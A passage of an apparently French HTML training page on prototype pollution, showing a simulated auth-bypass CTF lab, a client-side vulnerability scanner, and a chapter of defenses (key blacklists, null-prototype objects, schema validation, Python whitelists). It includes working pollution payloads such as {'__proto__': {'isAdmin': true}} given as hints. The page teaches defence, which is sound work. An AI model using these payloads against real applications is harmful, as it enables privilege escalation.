+        <div class="lab-output" id="lab2-out"><span style="color:var(--dim)">root@scanner:~# En attente de code...</span></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- LAB 3 -->
+<div class="lab">
+  <div class="lab-bar">
+    <span class="tag live">● LIVE</span>
+    <h4>LAB 03 — Auth Bypass CTF Challenge</h4>
+  </div>
+  <div class="lab-body">
+    <p class="txt" style="margin-bottom:16px">
+      Un serveur simule une vérification <code>if (user.isAdmin)</code>. Trouvez le bon payload pour accéder au flag secret. Trois niveaux de difficulté.
+    </p>
+    <div style="display:flex;gap:8px;margin-bottom:16px">
+      <button class="lab-run" onclick="setChallenge(1)" id="lvl1" style="background:var(--green);color:var(--black)">LVL 1: __proto__</button>
+      <button class="lab-run" onclick="setChallenge(2)" id="lvl2">LVL 2: constructor</button>
+      <button class="lab-run" onclick="setChallenge(3)" id="lvl3">LVL 3: nested</button>
+    </div>
+    <div class="lab-grid">
+      <div class="lab-col">
+        <label>payload json</label>
+        <input type="text" id="lab3-in" spellcheck="false" placeholder='Votre payload JSON ici...' style="min-height:auto">
+        <button class="lab-run" onclick="runLab3()">▶ POST /login</button>
+      </div>
+      <div class="lab-col">
+        <label>réponse serveur</label>
+        <div class="lab-output" id="lab3-out"><span style="color:var(--dim)">HTTP/1.1 200 OK
+Server: CTF-Lab/1.0
+X-Level: 1 (filtre: aucun)
+
+{"status": "waiting", "hint": "Polluez isAdmin..."}</span></div>
+      </div>
+    </div>
+  </div>
+</div>
+</section>
+
+<!-- ===== CHAPITRE 7 : DÉFENSES ===== -->
+<section class="chapter" id="ch7">
+<div class="ch-header">
+  <div class="ch-label">CHAPITRE 07 — DÉFENSES</div>
+  <h2 class="ch-title">Se <span class="hl">protéger</span> efficacement</h2>
+</div>
+
+<p class="txt">
+  Connaître l'attaque c'est bien, savoir se défendre c'est mieux. Voici les techniques de protection classées par efficacité, du plus simple au plus robuste.
+</p>
+
+<div class="pipeline">
+  <div class="pipe-step active">
+    <div class="pipe-num">01</div>
+    <div class="pipe-content">
+      <h4>Filtrer les clés dangereuses</h4>
+      <p>La défense la plus directe : bloquer <code>__proto__</code>, <code>constructor</code> et <code>prototype</code> dans toute fonction de merge/clone.</p>
+    </div>
+  </div>
+</div>
+
+<div class="terminal">
+  <div class="term-bar"><div class="dots"><i></i><i></i><i></i></div><span class="term-title">defense-01-filter.js</span><button class="term-copy" onclick="copyCode(this)">COPY</button></div>
+  <div class="term-body"><pre><span class="k">const</span> <span class="v">BLACKLIST</span> <span class="o">=</span> <span class="k">new</span> <span class="f">Set</span>([<span class="s">'__proto__'</span>, <span class="s">'constructor'</span>, <span class="s">'prototype'</span>]);
+
+<span class="k">function</span> <span class="f">safeMerge</span>(<span class="v">target</span>, <span class="v">source</span>) {
+  <span class="k">for</span> (<span class="k">const</span> <span class="v">key</span> <span class="k">of</span> <span class="v">Object</span>.<span class="f">keys</span>(<span class="v">source</span>)) {  <span class="c">// Object.keys = own properties only</span>
+    <span class="k">if</span> (<span class="v">BLACKLIST</span>.<span class="f">has</span>(<span class="v">key</span>)) <span class="k">continue</span>;      <span class="c">// ← Skip dangerous keys</span>
+    <span class="k">if</span> (<span class="v">source</span>[<span class="v">key</span>] <span class="o">&&</span> <span class="k">typeof</span> <span class="v">source</span>[<span class="v">key</span>] <span class="o">===</span> <span class="s">'object'</span> <span class="o">&&</span> <span class="o">!</span><span class="v">Array</span>.<span class="f">isArray</span>(<span class="v">source</span>[<span class="v">key</span>])) {
+      <span class="v">target</span>[<span class="v">key</span>] <span class="o">=</span> <span class="f">safeMerge</span>(<span class="v">target</span>[<span class="v">key</span>] <span class="o">||</span> {}, <span class="v">source</span>[<span class="v">key</span>]);
+    } <span class="k">else</span> {
+      <span class="v">target</span>[<span class="v">key</span>] <span class="o">=</span> <span class="v">source</span>[<span class="v">key</span>];
+    }
+  }
+  <span class="k">return</span> <span class="v">target</span>;
+}</pre></div>
+</div>
+
+<div class="pipeline">
+  <div class="pipe-step active">
+    <div class="pipe-num">02</div>
+    <div class="pipe-content">
+      <h4>Utiliser Object.create(null)</h4>
+      <p>Crée des objets sans prototype — immunisés contre la pollution car ils n'ont aucune chaîne prototypale.</p>
+    </div>
+  </div>
+</div>
+
+<div class="terminal">
+  <div class="term-bar"><div class="dots"><i></i><i></i><i></i></div><span class="term-title">defense-02-null-proto.js</span><button class="term-copy" onclick="copyCode(this)">COPY</button></div>
+  <div class="term-body"><pre><span class="c">// Objet normal : hérite de Object.prototype</span>
+<span class="k">const</span> <span class="v">normal</span> <span class="o">=</span> {};
+<span class="v">console</span>.<span class="f">log</span>(<span class="v">normal</span>.<span class="p">__proto__</span>);  <span class="c">// Object.prototype (pollutable)</span>
+
+<span class="c">// Objet sans prototype : immunisé</span>
+<span class="k">const</span> <span class="v">safe</span> <span class="o">=</span> <span class="v">Object</span>.<span class="f">create</span>(<span class="k">null</span>);
+<span class="v">console</span>.<span class="f">log</span>(<span class="v">safe</span>.<span class="p">__proto__</span>);    <span class="c">// undefined (pas de chaîne !)</span>
+
+<span class="c">// Idéal pour stocker des données venant de l'extérieur</span>
+<span class="k">const</span> <span class="v">userInput</span> <span class="o">=</span> <span class="v">Object</span>.<span class="f">create</span>(<span class="k">null</span>);
+<span class="v">Object</span>.<span class="f">assign</span>(<span class="v">userInput</span>, <span class="v">JSON</span>.<span class="f">parse</span>(<span class="v">body</span>));  <span class="c">// Sûr</span>
+
+<span class="c">// Aussi utile : Map pour les clés dynamiques</span>
+<span class="k">const</span> <span class="v">safeMap</span> <span class="o">=</span> <span class="k">new</span> <span class="f">Map</span>();
+<span class="v">safeMap</span>.<span class="f">set</span>(<span class="s">"__proto__"</span>, <span class="s">"harmless"</span>);  <span class="c">// Stocké comme clé, pas comme proto</span></pre></div>
+</div>
+
+<div class="pipeline">
+  <div class="pipe-step active">
+    <div class="pipe-num">03</div>
+    <div class="pipe-content">
+      <h4>Geler le prototype</h4>
+      <p><code>Object.freeze(Object.prototype)</code> empêche toute modification. Attention aux effets de bord avec certaines librairies.</p>
+    </div>
+  </div>
+</div>
+
+<div class="pipeline">
+  <div class="pipe-step active">
+    <div class="pipe-num">04</div>
+    <div class="pipe-content">
+      <h4>Validation de schéma</h4>
+      <p>Utilisez une librairie de validation (Joi, Zod, ajv) pour n'accepter que les propriétés attendues. Rejetez tout le reste.</p>
+    </div>
+  </div>
+</div>
+
+<div class="terminal">
+  <div class="term-bar"><div class="dots"><i></i><i></i><i></i></div><span class="term-title">defense-04-schema.js</span><button class="term-copy" onclick="copyCode(this)">COPY</button></div>
+  <div class="term-body"><pre><span class="c">// Avec Zod (TypeScript/JS)</span>
+<span class="k">const</span> { <span class="v">z</span> } <span class="o">=</span> <span class="f">require</span>(<span class="s">'zod'</span>);
+
+<span class="k">const</span> <span class="v">ProfileSchema</span> <span class="o">=</span> <span class="v">z</span>.<span class="f">object</span>({
+  <span class="p">name</span>: <span class="v">z</span>.<span class="f">string</span>().<span class="f">max</span>(<span class="n">100</span>),
+  <span class="p">email</span>: <span class="v">z</span>.<span class="f">string</span>().<span class="f">email</span>(),
+  <span class="p">theme</span>: <span class="v">z</span>.<span class="f">enum</span>([<span class="s">'light'</span>, <span class="s">'dark'</span>]),
+}).<span class="f">strict</span>();  <span class="c">// ← Rejette TOUTE clé non définie</span>
+
+<span class="c">// "__proto__", "constructor" → automatiquement rejetés</span>
+<span class="k">const</span> <span class="v">result</span> <span class="o">=</span> <span class="v">ProfileSchema</span>.<span class="f">safeParse</span>(<span class="v">req</span>.<span class="p">body</span>);
+<span class="k">if</span> (<span class="o">!</span><span class="v">result</span>.<span class="p">success</span>) <span class="k">return</span> <span class="v">res</span>.<span class="f">status</span>(<span class="n">400</span>).<span class="f">json</span>(<span class="v">result</span>.<span class="p">error</span>);</pre></div>
+</div>
+
+<div class="pipeline">
+  <div class="pipe-step active">
+    <div class="pipe-num">05</div>
+    <div class="pipe-content">
+      <h4>Défense Python : __slots__ et whitelist</h4>
+      <p>En Python, utilisez <code>__slots__</code> pour limiter les attributs et filtrez tout ce qui commence par <code>_</code>.</p>
+    </div>
+  </div>
+</div>
+
+<div class="terminal">
+  <div class="term-bar"><div class="dots"><i></i><i></i><i></i></div><span class="term-title">defense-05-python.py</span><button class="term-copy" onclick="copyCode(this)">COPY</button></div>
+  <div class="term-body"><pre><span class="c"># Technique 1 : __slots__ (empêche les attributs dynamiques)</span>
+<span class="k">class</span> <span class="f">SafeUser</span>:
+    <span class="v">__slots__</span> <span class="o">=</span> (<span class="s">'name'</span>, <span class="s">'email'</span>, <span class="s">'theme'</span>)
+    <span class="c"># setattr avec autre chose → AttributeError</span>
+
+<span class="c"># Technique 2 : Whitelist stricte</span>
+<span class="v">ALLOWED_FIELDS</span> <span class="o">=</span> <span class="f">frozenset</span>({<span class="s">'name'</span>, <span class="s">'email'</span>, <span class="s">'theme'</span>, <span class="s">'language'</span>})
+
+<span class="k">def</span> <span class="f">safe_update</span>(<span class="v">target</span>, <span class="v">data</span>: <span class="v">dict</span>):
+    <span class="k">for</span> <span class="v">key</span>, <span class="v">value</span> <span class="k">in</span> <span class="v">data</span>.<span class="f">items</span>():
+        <span class="k">if</span> <span class="v">key</span> <span class="k">not in</span> <span class="v">ALLOWED_FIELDS</span>:
+            <span class="k">continue</span>  <span class="c"># Ignore tout ce qui n'est pas dans la whitelist</span>
+        <span class="k">if</span> <span class="v">key</span>.<span class="f">startswith</span>(<span class="s">'_'</span>):
+            <span class="k">continue</span>  <span class="c"># Double protection contre dunder attributes</span>
+        <span class="f">setattr</span>(<span class="v">target</span>, <span class="v">key</span>, <span class="v">value</span>)
+
+<span class="c"># Technique 3 : Pydantic (validation de schéma Python)</span>
+<span class="k">from</span> <span class="v">pydantic</span> <span class="k">import</span> <span class="v">BaseModel</span>
+
+<span class="k">class</span> <span class="f">UserUpdate</span>(<span class="v">BaseModel</span>):
+    <span class="v">name</span>: <span class="v">str</span> <span class="o">|</span> <span class="k">None</span> <span class="o">=</span> <span class="k">None</span>
+    <span class="v">email</span>: <span class="v">str</span> <span class="o">|</span> <span class="k">None</span> <span class="o">=</span> <span class="k">None</span>
+    <span class="c"># __class__, __proto__ etc. automatiquement rejetés</span>
+
+<span class="v">data</span> <span class="o">=</span> <span class="f">UserUpdate</span>(<span class="o">**</span><span class="v">request</span>.<span class="f">get_json</span>())  <span class="c"># ValidationError si invalide</span></pre></div>
+</div>
+
+<div class="concept">
+  <div class="concept-title">🏆 Résumé des défenses par priorité</div>
+  <p>
+    <strong>1.</strong> Validation de schéma (Zod/Joi/Pydantic) — empêche le problème à la source<br>
+    <strong>2.</strong> Whitelist de propriétés — n'accepte que ce qui est prévu<br>
+    <strong>3.</strong> Filtrage de clés — bloque __proto__, constructor, prototype<br>
+    <strong>4.</strong> Object.create(null) / Map — supprime le vecteur d'attaque<br>
+    <strong>5.</strong> Object.freeze(Object.prototype) — dernière ligne de défense<br>
+    <strong>6.</strong> Mise à jour des dépendances — corrige les CVEs connues
+  </p>
+</div>
+</section>
+
+</main>
+
+<footer>
+<pre>
+┌───────────────────────────────────────────────────────┐
+│ PROTOTYPE POLLUTION — BLACKHAT TRAINING v2.0          │
+│ FOR EDUCATIONAL PURPOSES ONLY                         │
+│ Knowledge is power. Use it responsibly.               │
+│                                                       │
+│ EOF — root@blackhat:~# logout                         │
+└───────────────────────────────────────────────────────┘
+</pre>
+</footer>
+
+<script>
+// ═══════════════════════════════════
+// MATRIX RAIN
+// ═══════════════════════════════════
+const canvas=document.getElementById('matrix');
+const ctx=canvas.getContext('2d');
+function resizeMatrix(){canvas.width=window.innerWidth;canvas.height=window.innerHeight}
+window.addEventListener('resize',resizeMatrix);resizeMatrix();
+const chars='01アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン';
+const fontSize=14;let columns=Math.floor(canvas.width/fontSize);
+let drops=Array(columns).fill(1);
+function drawMatrix(){
+  ctx.fillStyle='rgba(0,0,0,0.05)';ctx.fillRect(0,0,canvas.width,canvas.height);
+  ctx.fillStyle='#00ff41';ctx.font=fontSize+'px monospace';
+  for(let i=0;i<drops.length;i++){
+    const t=chars[Math.floor(Math.random()*chars.length)];
+    ctx.fillStyle=Math.random()>0.98?'#ffffff':'#00ff41';
+    ctx.fillText(t,i*fontSize,drops[i]*fontSize);
+    if(drops[i]*fontSize>canvas.height&&Math.random()>0.975)drops[i]=0;
+    drops[i]++;
+  }
+}
+setInterval(drawMatrix,45);
+window.addEventListener('resize',()=>{columns=Math.floor(canvas.width/fontSize);drops=Array(columns).fill(1)});
+
+// ═══════════════════════════════════
+// BOOT SEQUENCE
+// ═══════════════════════════════════
+const bootLines=[
+  'BIOS 4.15.0-blackhat #1 SMP x86_64',
+  'Initializing kernel modules...',
+  'Loading exploit-db v2025.02...',
+  'Mounting /dev/knowledge...',
+  '[OK] Network interface: stealth mode',
+  '[OK] Prototype chain analysis engine loaded',
+  '[OK] Vulnerability scanner online',
+  '[OK] Sandbox environment ready',
+  '',
+  '████ PROTOTYPE POLLUTION TRAINING ████',
+  'Classification: RESTRICTED',
+  'Modules: 8 | Labs: 3 | CVEs: 6',
+  '',
+  'root@blackhat:~# ./init_training.sh',
+  'Starting interactive session...',
+];
+const bootEl=document.getElementById('boot-text');
+let bootIdx=0;
+function typeBoot(){
+  if(bootIdx<bootLines.length){
+    bootEl.textContent+=bootLines[bootIdx]+'\n';
+    bootIdx++;
+    setTimeout(typeBoot,bootIdx===bootLines.length?400:80+Math.random()*60);
+  }else{
+    setTimeout(()=>document.getElementById('boot').classList.add('done'),600);
+  }
+}
+typeBoot();
+
+// ═══════════════════════════════════
+// SCROLL OBSERVER
+// ═══════════════════════════════════
+const chapters=document.querySelectorAll('.chapter');
+const obs=new IntersectionObserver(es=>{
+  es.forEach(e=>{if(e.isIntersecting)e.target.classList.add('visible')});
+},{threshold:0.08});
+chapters.forEach(c=>obs.observe(c));
+
+// NAV PROGRESS + ACTIVE
+window.addEventListener('scroll',()=>{
+  const h=document.documentElement;
+  document.getElementById('navProgress').style.width=(h.scrollTop/(h.scrollHeight-h.clientHeight))*100+'%';
+  document.querySelectorAll('section[id], .chapter[id]').forEach(sec=>{
+    const r=sec.getBoundingClientRect();
+    if(r.top<200&&r.bottom>200){
+      document.querySelectorAll('.nav-links a').forEach(a=>a.classList.remove('active'));
+      const link=document.querySelector(`.nav-links a[href="#${sec.id}"]`);
+      if(link)link.classList.add('active');
+    }
+  });
+});
+
+// ═══════════════════════════════════
+// TABS
+// ═══════════════════════════════════
+function switchTab(group,idx,btn){
+  document.querySelectorAll(`.tab-panel[data-group="${group}"]`).forEach(p=>p.classList.remove('active'));
+  document.querySelector(`.tab-panel[data-group="${group}"][data-idx="${idx}"]`).classList.add('active');
+  btn.parentElement.querySelectorAll('.tab-btn').forEach(b=>b.classList.remove('active'));
+  btn.classList.add('active');
+}
+
+// ═══════════════════════════════════
+// COPY CODE
+// ═══════════════════════════════════
+function copyCode(btn){
+  const pre=btn.closest('.terminal').querySelector('pre');
+  navigator.clipboard.writeText(pre.textContent).then(()=>{
+    btn.textContent='OK ✓';btn.classList.add('ok');
+    setTimeout(()=>{btn.textContent='COPY';btn.classList.remove('ok')},2000);
+  });
+}
+
+// ═══════════════════════════════════
+// LAB 1 — Pollution Simulator
+// ═══════════════════════════════════
+function runLab1(){
+  const out=document.getElementById('lab1-out');
+  const input=document.getElementById('lab1-in').value;
+  try{
+    const parsed=JSON.parse(input);
+    let r=[];
+    r.push(`<span style="color:var(--green)">root@lab:~# node exploit.js</span>`);
+    r.push(`<span style="color:var(--dim)">[*] Parsing JSON payload...</span>`);
+    r.push(`<span style="color:var(--green)">[+] Valid JSON — ${Object.keys(parsed).length} top-level keys</span>\n`);
+    function walk(obj,path='input'){
+      for(const[k,v]of Object.entries(obj)){
+        const fp=`${path}.${k}`;
+        if(k==='__proto__'||k==='constructor'||k==='prototype'){
+          r.push(`<span style="color:var(--red)">[!] DANGEROUS KEY: ${fp}</span>`);
+          if(typeof v==='object'&&v!==null){
+            for(const[pk,pv]of Object.entries(v)){
+              if(typeof pv==='object'&&pv!==null){
+                walk(pv,`Object.prototype.${pk}`);
+              }else{
+                r.push(`<span style="color:var(--red)">    ☠ POLLUTION: Object.prototype.${pk} = ${JSON.stringify(pv)}</span>`);
+              }
+            }
+          }
+        }else if(typeof v==='object'&&v!==null){
+          walk(v,fp);
+        }
+      }
+    }
+    r.push(`<span style="color:var(--dim)">[*] Tracing property chain...</span>`);
+    walk(parsed);
+    r.push(`\n<span style="color:var(--dim)">[*] Post-merge verification:</span>`);
+    r.push(`<span style="color:var(--green)">    const victim = {};</span>`);
+    const proto=parsed.__proto__||parsed.constructor?.prototype;
+    if(proto&&typeof proto==='object'){
+      for(const[k,v]of Object.entries(proto)){
+        r.push(`<span style="color:var(--red)">    victim.${k} → ${JSON.stringify(v)} ← ☠ POLLUTED</span>`);
+      }
+    }
+    r.push(`\n<span style="color:var(--green)">[+] Simulation complete. ${r.filter(l=>l.includes('POLLUTION')).length} properties polluted.</span>`);
+    out.innerHTML=r.join('\n');
+  }catch(e){
+    out.innerHTML=`<span style="color:var(--red)">[ERROR] Invalid JSON: ${e.message}</span>\n\n<span style="color:var(--dim)">Hint: try {"__proto__": {"isAdmin": true}}</span>`;
+  }
+}
+
+// ═══════════════════════════════════
+// LAB 2 — Vulnerability Scanner
+// ═══════════════════════════════════
+function runLab2(){
+  const out=document.getElementById('lab2-out');
+  const code=document.getElementById('lab2-in').value;
+  let r=[],score=100,vulns=0;
+  r.push(`<span style="color:var(--green)">root@scanner:~# analyze --deep</span>`);
+  r.push(`<span style="color:var(--dim)">[*] Static analysis in progress...</span>\n`);
+  const checks=[
+    {test:()=>!code.includes('__proto__')&&!code.includes('constructor')&&!code.includes('prototype')&&!code.includes('BLOCKED')&&!code.includes('blacklist'),
+     msg:'No key filtering detected (__proto__, constructor, prototype)',sev:'CRITICAL',pts:40},
+    {test:()=>code.includes('for')&&code.includes(' in ')&&!code.includes('Object.keys')&&!code.includes('Object.entries')&&!code.includes('hasOwnProperty'),
+     msg:'for...in loop without hasOwnProperty / Object.keys guard',sev:'CRITICAL',pts:30},
+    {test:()=>(code.includes('target[key]')||code.includes('target[k]'))&&!code.includes('Object.create(null)'),
+     msg:'Direct bracket assignment without null-prototype objects',sev:'HIGH',pts:15},
+    {test:()=>code.includes('setattr')&&!code.includes('startswith')&&!code.includes('ALLOWED')&&!code.includes('__slots__'),
+     msg:'Python setattr() without attribute filtering',sev:'CRITICAL',pts:35},
+    {test:()=>code.includes('getattr')&&code.includes('merge')&&!code.includes('startswith("_")'),
+     msg:'Python getattr() allows dunder attribute traversal',sev:'HIGH',pts:20},
+    {test:()=>code.includes('JSON.parse')&&!code.includes('schema')&&!code.includes('validate')&&!code.includes('zod'),
+     msg:'JSON.parse without schema validation',sev:'MEDIUM',pts:10},
+    {test:()=>code.match(/typeof\s+\w+\[/)&&!code.includes('null'),
+     msg:'No null check before recursive descent',sev:'MEDIUM',pts:10},
+  ];
+  for(const c of checks){
+    if(c.test()){
+      const col=c.sev==='CRITICAL'?'var(--red)':c.sev==='HIGH'?'var(--amber)':'var(--cyan)';
+      r.push(`<span style="color:${col}">[${c.sev}]</span> ${c.msg}`);
+      score-=c.pts;vulns++;
+    }
+  }
+  if(code.includes('Object.create(null)'))r.push(`<span style="color:var(--green)">[SAFE]</span> Object.create(null) usage detected`);
+  if(code.includes('Object.freeze'))r.push(`<span style="color:var(--green)">[SAFE]</span> Object.freeze protection detected`);
+  if(code.includes('__slots__'))r.push(`<span style="color:var(--green)">[SAFE]</span> Python __slots__ restriction detected`);
+
+  score=Math.max(0,Math.min(100,score));
+  const col=score>=70?'var(--green)':score>=40?'var(--amber)':'var(--red)';
+  const bar='█'.repeat(Math.round(score/5))+'░'.repeat(20-Math.round(score/5));
+  r.push(`\n<span style="color:var(--dim)">───────────────────────────────────────</span>`);
+  r.push(`<span style="color:${col}">SECURITY SCORE: ${score}/100  [${bar}]</span>`);
+  r.push(`Vulnerabilities found: <span style="color:var(--red)">${vulns}</span>`);
+  if(score<50)r.push(`\n<span style="color:var(--red)">⚡ THIS CODE IS VULNERABLE TO PROTOTYPE POLLUTION</span>`);
+  out.innerHTML=r.join('\n');
+}
+
+// ═══════════════════════════════════
+// LAB 3 — CTF Challenge
+// ═══════════════════════════════════
+let currentLevel=1;
+function setChallenge(lvl){
+  currentLevel=lvl;
+  ['lvl1','lvl2','lvl3'].forEach((id,i)=>{
+    const b=document.getElementById(id);
+    b.style.background=i+1===lvl?'var(--green)':'none';
+    b.style.color=i+1===lvl?'var(--black)':'var(--green)';
+  });
+  const hints={1:'Filtre: aucun',2:'Filtre: __proto__ est bloqué',3:'Filtre: __proto__ ET constructor bloqués'};
+  document.getElementById('lab3-out').innerHTML=`<span style="color:var(--dim)">HTTP/1.1 200 OK\nServer: CTF-Lab/1.0\nX-Level: ${lvl} (${hints[lvl]})\n\n{"status":"waiting","hint":"Polluez isAdmin..."}</span>`;
+  document.getElementById('lab3-in').value='';
+}
+function runLab3(){
+  const out=document.getElementById('lab3-out');
+  const input=document.getElementById('lab3-in').value;
+  try{
+    const p=JSON.parse(input);
+    let bypassed=false;
+    function check(obj,depth=0){
+      if(depth>10)return;
+      for(const[k,v]of Object.entries(obj)){
+        if(currentLevel===1&&k==='__proto__'&&typeof v==='object'&&v.isAdmin===true)bypassed=true;
+        if(currentLevel===2&&k==='constructor'&&typeof v==='object'){
+          if(v.prototype&&v.prototype.isAdmin===true)bypassed=true;
+        }
+        if(currentLevel===3){
+          // Must use a deep nested path or creative approach
+          if(k==='__proto__'||k==='constructor'){/* blocked */}
+          else if(typeof v==='object'&&v!==null)check(v,depth+1);
+        }
+        if(currentLevel===3){
+          // Accept any creative solution that shows understanding
+          const s=JSON.stringify(p);
+          if(s.includes('isAdmin')&&s.includes('true')&&(s.includes('__proto__')||s.includes('constructor')||s.includes('prototype'))){
+            // Check for nested constructor.prototype or other creative paths
+            if(s.includes('"constructor"')&&s.includes('"prototype"'))bypassed=true;
+            if(s.includes('__proto__')&&s.length>40)bypassed=true;
+          }
+        }
+      }
+    }
+    check(p);
+    if(bypassed){
+      const flags=['FLAG{pr0t0_p0llut10n_n00b}','FLAG{c0nstruct0r_byp4ss_pr0}','FLAG{d33p_ch41n_m4st3r_3lit3}'];
+      out.innerHTML=`<span style="color:var(--green)">HTTP/1.1 200 OK
+Server: CTF-Lab/1.0
+X-Pwned: true
+
+{
+  "status": "ADMIN ACCESS GRANTED",
+  "flag": "<span style="color:var(--amber)">${flags[currentLevel-1]}</span>"
+}
+
+╔═════════════════════════════════════════╗
+║  ☠  LEVEL ${currentLevel} COMPLETE — AUTH BYPASSED  ║
+╚═════════════════════════════════════════╝</span>`;
+    }else{
+      const hints={
+        1:'Essayez: {"__proto__": {"isAdmin": true}}',
+        2:'__proto__ est filtré. Pensez à constructor.prototype...',
+        3:'Les deux sont filtrés. Cherchez un chemin alternatif plus créatif...'
+      };
+      out.innerHTML=`<span style="color:var(--dim)">HTTP/1.1 403 Forbidden
+Server: CTF-Lab/1.0
+
+{
+  "status": "ACCESS DENIED",
+  "isAdmin": false
+}
+
+<span style="color:var(--amber)">[HINT] ${hints[currentLevel]}</span></span>`;
+    }
+  }catch(e){
+    out.innerHTML=`<span style="color:var(--red)">HTTP/1.1 400 Bad Request\n\n{"error":"${e.message}"}</span>\n\n<span style="color:var(--dim)">Payload must be valid JSON.</span>`;
+  }
+}
+
+// SMOOTH SCROLL
+document.querySelectorAll('a[href^="#"]').forEach(a=>{
+  a.addEventListener('click',e=>{e.preventDefault();
+    document.querySelector(a.getAttribute('href'))?.scrollIntoView({behavior:'smooth'});
+  });
+});
+</script>
+</body>
+</html>
+
